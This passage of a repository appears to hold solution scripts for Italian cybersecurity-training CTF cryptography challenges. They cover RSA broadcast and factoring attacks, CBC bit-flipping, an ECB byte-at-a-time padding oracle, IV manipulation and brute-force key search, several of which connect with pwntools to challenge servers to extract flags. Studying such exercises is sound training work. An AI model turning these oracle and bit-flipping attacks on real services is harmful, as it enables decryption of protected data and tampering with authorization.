+n3 = 23838050423140936558562460836914990000121224433054180956149328392097556793667316051395499205459391191245485438210022208711148027111724831247247461090933209940553006233781244575390598686851235676392937357055956467403556227747823524974639093338798540030753050575841171520476565456059630096339800725487715394773878690373228209648986967888239841823872717087380612848249495118340530548835934905641970830085108482957067300522868576015793743453121886949470434128908802734492939453412557023585286779799713227594388588632020867337055023618559538617074264787033923843270145535819371573719259715642072717973124902457258321771347
+c3 = 23820834410319009559743960809720794391774581947038538415228280106997837157897090108519542599868525384247904915631281209059812034606324787706379657763015726767498277690658957739182996165116542426471011183119471496792642004209882354753650888745955407236129072797040642877016081917715818578627225332248054338942273434039665457582932701589783497268470192718502287806200983344302252335273787512676845896905610388818329193236287547829040782378448795242078213144222615114421583532886127564080358355302494890526888390444839507014294473014713866183254591628141151499475011064041581667373327792475514165108429484085105164915801
+n4 = 20231190450542694290076543653824375885200303128728793234287935676113985770830987376851823455180205455121779191978296905067921662289295935749175847143380164111263023301088762579532517169550217229673547170872841761749470430265838260284046151915214365851674123274598854462911290402192760647959590031662590561583498142476602476048601263121783751352688052191968737380642826694324605640395983183353057043079643294519979315411168655226463153190436393450264097435985087273529534014896144003830378693379660497106792732656909082732694264235438473645015491062276718517147791960417641698294282342117295069960498655252726177378587
+c4 = 2706969371162376228728890423766188747245457538646691389298310465516992469247591197626869619089211623668941222817651350540450319258021872979992899569608174595678878900487631348991580080712922158397534055071044730655629812810279392995217687460954644434984508769303517009966178255312378233075127014447067123120042805495019283640684643624565113562262008089417386990703468369568945798003085821337900744513118000904797241893403590763184547590687765790605155779804101328767493954122668916734241183593289879770876603609252500086865729812689256127977879225725265701848621035984215384871484059023586083665603686961880385624087
+n5 = 22030932364020464068766627998464232192750692419318530713257635574045490454202558562153830630563241338825546597983869792230292240347670025360611042424674900413395416049825657619871463022653207183921078750613648669929363479951767635857160643245554618557736827894240002016381908575016491269226817719531441574983858592219842620256021989614360936863986150207006753300905091346934105301888654651964358445186181573880851935251480664504715738592887941736527586445052308607860021536815624526115092744664524549988193575234087450150873549982285890648772351215799537103698423213414344193660909440351633329711285261200175762371999
+c5 = 14607685744969479180589025806509971873110491080648502017051350588532899803531614113897102442795220621854400185903168960152610439332504165193532866015636522563607020860526127959877068763940150929288512056823311353869685516402281907842329691509766816765948611727859365376203606514838258376769770943110130021091124412827668288623139665958622142999378266785850671903750825380367712362488805324781456872973726849930722038431410664437873209070793478347890807108006291223386468973769943538913127980599745793588238028931157192430621234615562341047842864330468149442935639401870707240936029499522979004552650917810608099205784
+n6 = 19008970760212503646193578945053722946482787133671220589566422530297555533927639035431807568066735360674019600905647013979669356733838295239977574347812472011895339334677021296888100143559065993987019367296052309174468434497316226979784943787655392403118080847480202898593427510499746130764891980380594425140100779166927519342029799618818522652785541700410042620042211319403475266992428174924259145675751452699975913287150065200723965344697830994742617395226657185014032229733905751197442326126778011994503923087269655435322340008285679518562603321484573990398186101254604883796826649824127744531262968200173865944417
+c6 = 6947763772791335411892238074614865485145103655337846999521102650048311243852353833732116348476895791280224872122308413137385062451463427172329948298974331288898133703160986551512953470653108385463930526837318177485841199774556327213393483284820095216698387615117327440052012722426886363623488491632153199477960117454594011205309804556720570255144812169581357241466008971304871706651309292174093739902826491745272774513656042271103289883391928127413451878550916726586770812466460877002329550705565269890101492700922148829047542382578337422916003098105794865000451230370387902961654136906363151230720460965756749113424
+n7 = 25156977070603854568453182667828749024804710917016303556067525728560014443419727077660154046303496214294922250362716204342020053030280486581562521843841270203873516139733307198164028046813349707463817487939390801836071877338451478104888354336131309699899153696671158772972053329467074760603590942436186415509054621286356224086734025777590063202648537937602914761233653097448777348909966679207179478127331519660889251299549483547418201333171144112527987247658017434293609065780174601262280144971879865339868057115123769606170531493431173684132806838752903723225647937421010863747852829780757875338904937641860256364371
+c7 = 21276640306058865628993608936367018390736113933132904848011140695652297236794825642563145139666894373000182945934831644280772683387870538249889727255201559283844573964092790345682620505723338818404012023837475724829367921959494941438574214177195823928222297810027557575616280838231193516275220799021345531929164579041297375216561273070468057713990783123170758717854605177380306177609469610666808778594764234450273609652967304394416509891398651577379487242617357926870393828189563723274810669365938791870190416846933036165947200645052020922102458960101108614607705563024130497259895083850579465321024531085214978123166
+n8 = 18594717611389419196229878099317448710771926514149043357985548579001345917432041356783304089173846309058489761169138675169256709933003463151388061364493281417451652538191435673500749994312255102003282119849873385307800591869577729811198865021144092216639591006673011939424694114294730330956388661717490333335445881618873723145982838456388683408253207233619081792099390804485383500663070567942714907199621898754250876447025031241150897815850916962578351477240752891867188515233281333209466412939138222535316792017930341180818427593460164133965892153894759522750915175306040963977042469371550543878948402256701684779623
+c8 = 6036974290353317362194502258972979794475352032346381595272430426302979509680690001244213243448231426430661626887331093201827830698849605294421524573918812947236075496292752991155137622388752482603544174705971156012423054446359803672077798164131898414776830503411882344545630151541623734874426075901231740844146092276410686402667167904488988064476989607321736461943716181504658072823061883661998620562312440877399418219176772545559218857112514704610369214424005681363537578540932509518261858754896048799269040074934687212709713192255100166813460028992274208569376899250198058565935566363894881004455531259298195510093
+n9 = 23524544794087097507384369102125719639534397098634534542200768805837021126796956952637290932911642193596272591181368910876656146557479066070020643727191178655639925427985989564637203355687743577558613061833267678575855331216227346596160551992641299004565622627332701691149011149816540775764309419224418920824867776734969382737057702099372777466122213192822906970477006649882306119365054232081518662697496333912537977561652763374931795835289301952902187999157731516326283600893916171372724839399644143690771761326817031830078759066392039540113061966666404949470968746938900094548590617364454920827405650998177885222517
+c9 = 3877860625339851840522186749425816683553177015668373002694683879698222700363678659691576076156003799828833144653925046879146649126602733435904903510992218510557584933439312823782378322339660956240593821289863152804890723944305279424524216762628125556522381606341347594669238283802683226413568306590027489901884668175690895843531286068741251346214304692910619875963292426099688685607915496149535060047117488129112993739446136952986990376053376233361015258335440208249181675377570425745499200793261010926300229609030157271919271568334891868542049132153923591507592120222500047967717981400702583622346737539151573039382
+n10 = 25857069860138471303144488792840157085249363021575812928785086684063602401229228335856109935003985817686850075919404009334969161115526128342041890647818457069266419591246908457699375289413261105426560593615384510875509815449402157778513069142450739016404018622222334878652064013567765642886843987501402422426591912500426812394970601055321933100163637425120374383152184525843600231618310446132633132805999362359936803251558629757254640147837598410866700971771550689479238436221713033170401371641504229614393489209567661051776977590958822859351229337264912789561771002038618444190837107921287606040619680371222878886867
+c10 = 5089857595194262374514276977809221712960194341109838425053432094131571296778264352000126740554185553856894880451930462905153817075871885026966257225895229945015483335853211411191865090936980123197727869252737701718418056792543481042422572858085875754888408249303753390089225523594622252029179212727223315658025548825636840539496159089493381542495010428109581242620936892687160416453081438652199500366733675383812975431374427459277664317831749515883723964353578429019701201852630398380254765736006732703494735584414154897767527510656026309239605628886255559185578584411989150708336242945495892932729415993859707079516
+n11 = 20472644279921006955430095779311150561360302546940578758471426431579062940834354537313645526279118001065930895723613613505340430842812470542549762458614018259988279048812829606329970529066431778017232265336408246510938680614984560341849530515126131511548041451350650884294169675336618579845854070617386212187666493457246444729440952377464080733109399478194707810498727652187290578043270449197097208721133930546352072194491001058182689803119464200982418904451363048744149048797021780688484174163668170050291591681941391009764509205640598499143882331397001107225588874894835837524411810450096369570201408511274529205373
+c11 = 10055504807953006148563204519584795032794662053464523933062462950749760684456440073752546655289554699049712249069424529506660425870295069875726031444984885686418275487452803087936183935625273658167549728923380467281115804948648072694735319647358749906891496809597887173059101831450185987250559600916267218580336936071782099001984126678012382535267537610507208869689807037077711795043538599447578650704493735785739102498541644783781691982235648490971914946209934310775307012375675233889547530984967858937663975550786078610588020374595298610052673948644263919948652995981824409494459883261645210791954589653803933775503
+n12 = 25326668515442609845954024043192989327900473398272750077295862679941122799561503875132082763245384585551304687978704660966576036359566573429511917366424893993266338847389431323042799052113056224456593989229888089223167835176247977759054621447512561509715334603913481639037825579729539160112088095677159844176126479167595937583401702532320838249109370326270552131410558777981158629102984270466164044639461825281544228729873964304181431722533162353995016693779861127638516228763455870535257914520425977499134037309016927478593011049859769689174599318431768130326208058790523476822328308114688833133479777594162891267647
+c12 = 22682457202489903254800743800596012863001437941526078232995213828463101830767383526208478005547208556808151815129371361213479700947558083062272236122537464814669889761629739555018165852204982409481597014859805372613649063586091928912222467405482401358120139254828614258745167811652022759737959238022085556902368621599199374840435028910783771528065109061769194545091038481156275006171632945420309526223371327180666677492384861497776929911116145922336283949282118222379967032500070730522098266623214257470735813953606512732934026520068927390217880799607632854832272095196064745242503162211043872081342732817560823263601
+n13 = 27982456930589360320227144474872335424054007766250176797041842427749429079988971111911408139225701422722065690402657934635610556516254819298545265236759493817487704198800274730746330959469759534251085179308191748358484414931711377914475789660638565784597487646218881751106691008420333625073610844438299202634578248091956232998682716810620321520226006153074187886926920555915336816926951320941858770761889687156785761083640882923460328361425560183053106034195114888628613508936786367632306206462847520854162173444748762781695716884718766938862198693201795725166637087371998006696117051867029867665852255424334720945507
+c13 = 16058187948662636657800207756238476975746511932336896901090952557585484506322441509733783145498653465298784533485550185853946025329074289807256163310507527651712958991445513507567913143709308911991368488643319785169632629540746935034906070252005314382373182904897564645418962600332766336523298257224296333058758851634640505700928922959711029310095381258646004502906033034835232030421114774510969058017736347960564882472114782374447835183835418496783161201497291136573185536807492442592038006359142361401085650732410742114144500493197690776994416064380901064356566650502767855643053658916447506789819348368357348077129
+n14 = 23756624427374190271544974066671006591921784668311157465785375426938600235921890033110370324086061932527685712851458144800301616682814947078048181350849522400167394375708868791638772223414580705471973944452220501312186330353111110953062699398449945579130010166821733137989913320583374106770242769237026389279727988407431791182629231298366252609843852070778991545357084093985493575327192982283678126881230497325980048429592827349341171776107604693466366431691761587847027039262642695422248027247272935950646874253524832776422785829409413998237290607857779932053374202131334769257674457374798167361364902667675778087057
+c14 = 4445027260135869103371706473528719844866361664598594975141586753777025335191510343251248849472741472796618608829164645927219954794900580912917123377996887876884424140448323392010019053931858823618597768235809319120951437037409988156190232040809917539356703488389611452688785274503467775231290933920270038401278573752808147813873227079136148043929391708181671762609981928743182430156687807587438389432881686898219867140146045101268734449552228197486377091032081361970388356245852206320118857685246211341005215148679434642626985631413759736595402817819801054022317337925648995620692608236359246731396483709459708490062
+n15 = 20829072179393688474894535114286500459282532585615643905501744677583929020714283844018582711442855708231283787864958854229726856840983057026185017266700208751871027183991722091596762743043261178819677889210496546565422717304317017967158728326647738689478213482682953474591589255207369553236366139284017059963159064584658450099915254469865606387832194148467903950856359911731906823599070027188675198339692686782369301456677418945451195068035138763498207585899459930361758448838904849574774184165225827276486728713518615847805734630218483354687075798030317046047151555305673977087171376827562300603898734707711251565597
+c15 = 2211676248163134096761392920074985045741118478956980864281385164116797521188287785602225304209064523188736760130695338403122918560462964845722169505788992004503346515750014636845698568029899762965477970019946946503732492152710500952659274446367999927056308242751025022530434907204908769772165904397754378446250134705335612620844454833895223877870605859993428122759891068602753310182336026416543110909838462295723275344099333352063462258287903776771220839180240788089867388323217930333378029416613989511966505191579705216388488649839185580045764197431143851536465626041663089978485531738192782549303692743057025567230
+n16 = 23357513175224207810415804039876832870681325595176605082437299653480051802804701531676415485043951681602275026938617569522285493294167231360952841579922304017663390533078366781794212637516540391385114854831633151131945992391571991734091896049337524382106116417133382651048552694210505660545675103175386806904196516696623755507484703228672776052462375161598311950411068238349536533090180043310072331041700012183558381365965608636990646967934015611271916727856386596735775790933551628275336666521773218498741825975888907770865568300533615505817047876350418217490346352100298353483401987130963351030649957695335326076221
+c16 = 11034222599340140041115738900679152449245202721283786539007420356253542660143118869082987631372445990526543995035226855734078948108396908572709286277636623338819984032907255497067273745895313550694503128017566760145363323501542502335724103522290111758266000625727243935910667609632652110564860623730357827608909682258816561151337507162265707453064312868625528923810225368026179988686419710098446420280110933064674316880974165361004677548977837655482557136447235690712178530386441601814538171489430461029143661344537834677661504962233184505419158113188889669538216339523920621144421230998356789624831707608958113292692
+e = 17
+
+mods = [eval(f"n{i}") for i in range(17)]
+rems = [eval(f"c{i}") for i in range(17)]
+
+g = gcd(mods[0], mods[1])
+for i in range(1, 17):
+    g = gcd(g, mods[(i+2)%17])
+assert g == 1
+res = libnum.solve_crt(rems, mods)
+x = int(libnum.nroot(res, e))
+print(long_to_bytes(x))
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ClassicChiper.py">
+alphabet = "abcdefghijklmnopqrstuvwxyz"
+
+def key():
+    for i in range(1, 26):
+        yield "".join([alphabet[i:], alphabet[0:i]])
+
+def decrypt(enc, key):
+    plain = ""
+    for k in range(len(enc)):
+        character = enc[k]
+        if ord(character) <= 122 and ord(character) >= 97:
+            i = key.index(character)
+            characterEncrypted = alphabet[i]
+            key = "".join([key[len(key)-1:],key[0:len(key)-1]])
+            plain = "".join([plain,characterEncrypted])
+        else:
+            plain = "".join([plain,character])
+    return plain
+    
+for i in key():
+    d = decrypt("xcqv{gvyavn_zvztv_etvtddlnxcgy}", i)
+    if "flag" in d:
+        print(d, end="")
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/CorruptedKeyExchange.py">
+#!/usr/bin/env python3
+from pwn import remote
+from base64 import b64decode
+from Crypto.Cipher import AES
+import re
+
+REGEX = r": [A-Za-z0-9+/=]*\n"
+
+r = remote("corrupted.challs.olicyber.it", 10604)
+g, p = b"1", b"ff"
+r.recv()
+r.sendline(g + b" " + p)
+text = r.recvuntil(b'=\n').decode()
+flag = b64decode(re.findall(REGEX, text)[0][2:-1].encode())
+cipher = AES.new(int(1).to_bytes(16, 'big'), AES.MODE_ECB)
+print(cipher.decrypt(flag).decode()[:-1])
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/CriptORiAND.py">
+#!/usr/bin/env python3
+from pwn import *
+from Crypto.Util.number import *
+from z3 import *
+
+risp = 'Nope!'
+ 
+while 'Nope!' in risp:
+    if args.REMOTE:
+        p = remote('cryptorland.challs.olicyber.it', 10801)
+    else:
+        p = process('./challenge.py')
+
+    n = []
+    for _ in range(10):
+        n.append(int(p.recvuntil(b'\n').decode()))
+        #print(p.recvline())
+
+    sol = BitVec('sol', 8 * 12)
+    s = Solver()
+    mini, maxi = 0, bytes_to_long(b'\xff' * 12)//2
+    for i in n:
+        x = BitVec(f'sol{str(i)}', 8 * 12)
+        if mini <= i <= maxi:
+            s.add(sol & x == i)
+        else:
+            s.add(sol | x == i)
+    print(s.check())
+    try:
+        m = s.model()
+        t = m[sol].as_long()
+        p.recvuntil(b'? ')
+        p.sendline(str(t).encode())
+        risp = p.recv().decode()
+        print(risp)
+    except:
+        pass
+    p.close()
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/CryptingOnStructure.py">
+dizionario = {'AAAAA': 'A', 'AAAAB': 'B', 'AAABA': 'C', 'AAABB': 'D', 'AABAA': 'E',
+              'AABAB': 'F', 'AABBA': 'G', 'AABBB': 'H', 'ABAAA': 'I', 'ABAAB': 'J',
+              'ABABA': 'K', 'ABABB': 'L', 'ABBAA': 'M', 'ABBAB': 'N', 'ABBBA': 'O',
+              'ABBBB': 'P', 'BAAAA': 'Q', 'BAAAB': 'R', 'BAABA': 'S', 'BAABB': 'T',
+              'BABAA': 'U', 'BABAB': 'V', 'BABBA': 'W', 'BABBB': 'X', 'BBAAA': 'Y', 
+              'BBAAB': 'Z'}
+ 
+chiper = "AAAABAAAAAAAABAABBBAABBABABAAABAABABAABAABBBABAABBAAAAABAABABAABBBBAAA"
+i = 0
+print("flag{", end="")
+while i < len(chiper):
+    print(dizionario[chiper[i:i+5]], end="")
+    i += 5
+print("}", end="")
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/flipMyWords.py">
+#!/usr/bin/env python3
+from base64 import b64encode, b64decode
+from pwn import *
+import re
+
+FLAG = r'flag{.*}'
+r = remote("flip.challs.olicyber.it", 10603)
+
+z = '{"admin":  true,'
+t = '{"admin": false,'
+xored = xor(z.encode(), t.encode())
+
+r.recvuntil(b'!!!\n')
+r.sendline(b'1')
+r.recvuntil(b': ')
+r.sendline(b'Dammi la flaaag!')
+r.recvuntil(b': ')
+msg = r.recvline().strip()
+r.recvuntil(b': ')
+iv = b64decode(r.recvline().strip().decode())
+iv = xor(iv, xored)
+iv = b64encode(iv)
+
+r.recvuntil(b'!!!\n')
+r.sendline(b'2')
+r.recvuntil(b': ')
+r.sendline(msg)
+r.recvuntil(b': ')
+r.sendline(iv)
+
+data = r.recvuntil(b'!!!\n').decode()
+flag = re.findall(FLAG, data)[0]
+print(flag)
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ILikeHashes.py">
+#!/usr/bin/env python3
+
+from hashlib import sha256
+import string
+
+strings = """252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111
+acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0
+ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb
+cd0aa9856147b6c5b4ff2b7dfee5da20aa38253099ef1b4a64aced233c9afe29
+021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96
+62c66a7a5dd70c3146618063c344e531e6d4b59e379808443ce962b3abd63c5a
+3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea
+cd0aa9856147b6c5b4ff2b7dfee5da20aa38253099ef1b4a64aced233c9afe29
+acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0
+de7d1b721a1e0632b7cf04edf5032c8ecffa9f9a08492152b926f1a5a7e765d7
+65c74c15a686187bb6bbf9958f494fc6b80068034a659a9ad44991b08c58f2d2
+d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
+0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6
+043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89
+ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb
+454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1
+3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea
+d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
+e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8
+0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6
+e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8
+e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8
+ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb
+d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
+acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0
+ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb
+d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde
+252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111
+acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0
+ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb
+cd0aa9856147b6c5b4ff2b7dfee5da20aa38253099ef1b4a64aced233c9afe29
+d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2""".split("\n")
+
+d = {}
+
+for i in string.printable:
+    h = sha256()
+    h.update(i.encode())
+    d[h.digest().hex()] = i
+
+for i in strings:
+    print(d[i], end="")
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ilTempoEDenaro.py">
+#!/usr/bin/env python3
+from Crypto.Util.number import long_to_bytes
+from tqdm import tqdm
+from pwn import *
+
+flag = [0] * 200
+while True:
+    r = remote("time.challs.olicyber.it", 10505)
+    for i in tqdm(range(200)): # size della flag in binario
+        if flag[i] == 1:
+            continue
+        r.recvuntil(b"> ")
+        r.sendline(b"1")
+        r.recvuntil(b"? ")
+        r.sendline(str(i).encode())
+        
+        f = r.recvline().decode().strip()
+        try:
+            bytes.fromhex(f)
+        except:
+            flag[i] = 1
+    r.close()
+    
+    binf = int("".join(map(str, flag)), 2)
+    flagf = long_to_bytes(binf)
+    print(flagf)
+    if b'flag{' in flagf:
+        input() # decidi se continuare o no
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/laMemoriaDiBOB.py">
+#!/usr/bin/env python3
+from Crypto.Util.Padding import pad
+from base64 import b64decode
+import string
+from pwn import *
+
+r = remote("bob.challs.olicyber.it", 10602)
+M = b'Bob: '
+# buff = b''
+# r.recvuntil(M)
+# r.sendline(buff)
+# f = r.recvline()
+
+# for i in range(16):
+#     r.recvuntil(b'1\n')
+#     r.sendline(b'1')
+#     r.recvuntil(M)
+#     r.sendline(buff + b'a')
+#     if len(r.recvline()) > len(f):
+#         break
+#     buff += b'a'
+# # Trovato che len('Bob: ') + len(chat) è esattamente multiplo di 16
+# assert len(buff) == 16
+
+chat = b". Cosa ne pensi? Bob: Ok. Allora mi puoi dare la flag? Alice: Nah, ma ti pare? Sono studiata io... Bob: Ma seriamente, ti immagini se qualcuno riuscisse ad ottenere i nostri messaggi?"
+alph = (string.ascii_letters + ' ' + string.digits + '?!:,.;_{}\'').encode('utf-8')
+while True:
+    flag = False
+    if len(chat + b'0') % 16 == 6: # \n nel padding
+        # consiglio di guessare il secondo carattere
+        for i in alph:
+            for e in alph:
+                if 10 in [i, e]: # \n
+                    continue
+                r.recvuntil(M)
+                test = pad(bytes([i, e]) + chat, 16)
+                r.sendline(b'a' * 11 + test + b'a' * (len(chat) + 2))
+                r.recvline()
+                resp = b64decode(r.recvline())
+
+                enc = resp[-len(test):][:16]
+                guess = resp[16:32]
+
+                print(enc.hex(), guess.hex(), bytes([i, e]))
+                r.recvuntil(b'1\n')
+                r.sendline(b'1')
+                if enc == guess:
+                    flag = True
+                    chat = bytes([i, e]) + chat
+                    print(chat)
+                    break
+            if flag:
+                break
+        assert flag
+        continue
+
+    for char in alph:
+        if char == ord('\n'):
+            continue            
+        r.recvuntil(M)
+        test = pad(bytes([char]) + chat, 16)
+        r.sendline(b'a' * 11 + test + b'a' * (len(chat) + 1))
+        r.recvline()
+        resp = b64decode(r.recvline())
+
+        enc = resp[-len(test):][:16]
+        guess = resp[16:32]
+
+        print(enc.hex(), guess.hex(), bytes([char]))
+        if enc == guess:
+            flag = True
+            chat = bytes([char]) + chat
+            print(chat)
+            break
+        r.recvuntil(b'1\n')
+        r.sendline(b'1')
+    if not flag:
+        break
+    r.recvuntil(b'1\n')
+    r.sendline(b'1')
+print(chat)
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/Maturity.py">
+
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ModesDiff.py">
+#!/usr/bin/env python3
+from Crypto.Cipher import AES
+from pwn import xor, remote
+
+t = bytes.fromhex("866bb5802051d56f37b1073a501b4afe4324424336ba60d4efe9af817b27a95a0f3adec8b809088bbaaebbfa0629c079")
+iv = t[:16]
+flag = [t[16:32],t[32:48]]
+
+for i in flag:
+    assert len(i) == 16
+flagDecoded = ""
+temp = iv
+for i in range(2):
+    r = remote("modes.challs.olicyber.it", 10802)
+    r.recvuntil(b": ")
+    r.sendline(flag[i].hex().encode())
+    risp = bytes.fromhex(r.recvline().strip().decode())
+    flagDecoded += xor(risp,temp).decode()
+    temp = flag[i]
+print(flagDecoded)
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/NiceRSA.py">
+from sympy import *
+from Crypto.Util.number import *
+n = 146652948863107767915515696389262268647958080423363432809510595078682568112085519929016552006340132750260244391442650419716209388476887752518821948643355769332931080957723170703642823372471212059667069985712741031890734368079274545006791082030796999444978356751235369237849185209094420930556569139123564127723
+e = 65537
+ct = 29866550050067643692473619455049192140190479758069897252295829267390344690107747214634468574079853475351608563312052986143110232253489826549882185837122231695139253296376749571108533659993018491393797757794110130200246559684585596096579385116077972392131805016636133672522654864012092864459984453971252224283
+p = nextprime(int(sqrt(n)))
+q = n // p
+phi = (p-1)*(q-1)
+d = pow(e, -1, phi)
+m = pow(ct, d, n)
+print(long_to_bytes(m).decode())
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/PiuPotenzaDiCalcolo.py">
+#!/usr/bin/env python3
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from libnum import factorial_mod
+import os
+
+def handle():
+    flag = bytes.fromhex("b5609cfbad99f1b20ec3a93b97f379d8426f934ffcb77d83ea9161fefa78d243")
+    for i in range(pow(10, 16)):
+        keyExchanged = str(i) # hmmm
+        encryptedFlag = decrypt(flag,keyExchanged)
+        if b'flag' in encryptedFlag:
+            print(encryptedFlag)
+            return
+
+def fakePadding(k):
+    if (len(k) > 16):
+        raise ValueError('La tua chiave è più lunga di 16 byte')
+    else:
+        if len(k) == 16:
+            return k
+        else:
+            missingBytes = 16 - len(k)
+            for i in range(missingBytes):
+                k = ''.join([k,"0"])
+            return k
+
+def encrypt(f,k):
+    key = bytes(fakePadding(k),"utf-8")
+
+    cipher = AES.new(key, AES.MODE_ECB)
+    encryptedFlag = cipher.encrypt(pad(f, AES.block_size))
+    return encryptedFlag
+
+def decrypt(f, k):
+    
+    key = fakePadding(str(k))
+ 
+    chiave = bytes(key, "utf-8")
+    cipher = AES.new(chiave, AES.MODE_ECB)
+    decryptedFlag = cipher.decrypt(f)
+    return decryptedFlag
+
+if __name__ == "__main__":
+    handle()
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/PrivateIV.py">
+#!/usr/bin/env python3
+from pwn import remote, xor
+import os
+
+r = remote("privateiv.challs.olicyber.it", 10021)
+
+def encrypt(payload):
+    r.recvuntil(b'> ')
+    r.sendline(b'1')
+    r.recvuntil(b'messaggio: ')
+    r.sendline(payload.encode())
+    r.recvuntil(b': ')
+    encoded = r.recvline().strip().decode()
+    return encoded
+
+def decrypt(payload):
+    r.recvuntil(b'> ')
+    r.sendline(b'2')
+    r.recvuntil(b'messaggio: ')
+    r.sendline(payload.encode())
+    r.recvuntil(b': ')
+    encoded = r.recvline().strip().decode()
+    return encoded
+
+payload = os.urandom(47).hex()
+encoded = bytes.fromhex(encrypt(payload))
+flag = bytes.fromhex(decrypt(encoded[:16].hex() + '00' * 16 + encoded[:16].hex()))
+print(len(flag))
+print(xor(flag[:16], flag[32:]))
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/ProbablyASimpleSiveWontBeEnough.py">
+from Crypto.Util.number import *
+cipher = [6513402340379073542230710001434049959082564276254477896792619, 
+          2739603094136133383923409703861575117091198809308633380325460]
+n = 9565158649535229609530047362785645907094563351070470563788237
+e = 65537
+p = 2771826449193354891007108898387 # funzione factor(n) su sagemath
+q = 3450850486082503930213321971551
+phi = (p-1)*(q-1)
+d = pow(e, -1, phi)
+for i in cipher:
+    print(long_to_bytes(pow(i, d, n)).decode(), end="")
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/RestlessSooperArmy.py">
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+from Crypto.Util.Padding import unpad
+
+p = 20901558209304821827 # valori usati 
+q = 19266041191182381619 # letti usando netcat
+e = 65537
+r = RSA.construct([p*q,e])
+print(r.n)
+print((p-1)*(q-1))
+d = pow(e, -1, (p-1)*(q-1))
+print(d)
+r = bytes_to_long(b"CTF")
+print(pow(r, e, p*q))
+chiave = pow(bytes_to_long(bytes.fromhex("ea69185e01f77cd08d6236de17d85639")), d, p*q)
+a = AES.new(long_to_bytes(chiave), AES.MODE_CBC, iv=bytes.fromhex("a1530168843c2e3e46aec4b11b29a4cd"))
+print(unpad(a.decrypt(bytes.fromhex("5d8eabe7dc10af7f787e32f003ce7fe6b917fca1562c29ff3b9f27c9622e902d")), AES.block_size))
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/RSALaPrimaChiave.py">
+#!/usr/bin/env python3
+from Crypto.Util.number import *
+import string
+e = 65537
+n = 11599469215086283756239000323368207328888145111801687279952858519692571454576743213591474246385542521855249880051364427742007447330667804421622274846205769
+c = [5880792219702857038643631444000662274997090749990816412642858237750864568276888684497432046359989695313347389766998519842370345512391791676822845113398754, 4976972096947215995604250302120022863724895715346083646855543963329247781262451899029118643158061394120410879487993483866284176498327793885573656815959625, 11533478320221726260579640234629942318235499494819282592707750949879377838153010591699870387733922335237346601688052059159711330257768224077404011307065502, 6578746857498711761521471737262108194348271400824730284518810946761224187855742368157346489709474171892314244109091096808461225937239969612671436689947146, 40392424158100314627057049269725003226278847219814028431132604271016670430845243933350713012952527019147272452755597062194771694902059574620487790145357, 8940773031260128816353055588056553762174304755194627122656101231849888146723299412495411641543320104568844524323442721074997637332927564813921786500578783, 7984784320545875917590734780858897857038334597156022063135915636401931746575156743176244483654097981682154627492244229120815526214459900295599313544227624, 8726361200928671469895309795311953939907207829055317813772040351606093030953303162108723050724434523055468294271626869389754617053082826339689136742130108, 7417749460829589872125015470473215663301512126557338249364767880097167628946787955886428357239009748621520124971407149634165113201860416364735206568534983, 3651575660315522748881313702629899556759815262116313174060673358864308845882922515867398534174480581039825296726046595117354947118504958035020484969190072, 2729665080212688034318826371788198585511207665652009253419241042229354649630802873944313152045039368936476429416274601231358654208866077925266462770458656, 10263048253606984297123478724549603022911190452564582984819673374864047714844730108530907695117857268312227035665259970999887200163673802445141625430514814, 4161268575042878388338254485204921903115753995587094245885781803476005854570440855893195593742898394111531505690716615694198992116059614015397479107995130, 7417749460829589872125015470473215663301512126557338249364767880097167628946787955886428357239009748621520124971407149634165113201860416364735206568534983, 